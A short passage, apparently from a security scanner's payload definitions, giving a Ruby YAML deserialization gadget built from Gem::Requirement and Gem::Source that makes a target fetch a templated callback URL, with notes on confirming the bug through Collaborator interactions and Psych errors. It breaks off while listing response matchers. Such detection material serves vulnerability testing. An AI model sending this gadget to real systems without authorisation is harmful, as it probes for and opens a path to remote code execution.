        {
          "payload": "--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    current_fetch_uri: http://{{callback}}/yaml",
          "description": "Ruby YAML Gem::Requirement gadget — triggers DNS/HTTP callback via Gem::Source fetch; check Collaborator for interaction. Psych or ArgumentError in error confirms YAML parsing",
          "matchers": [
            {"type": "status", "status": [400, 500]},
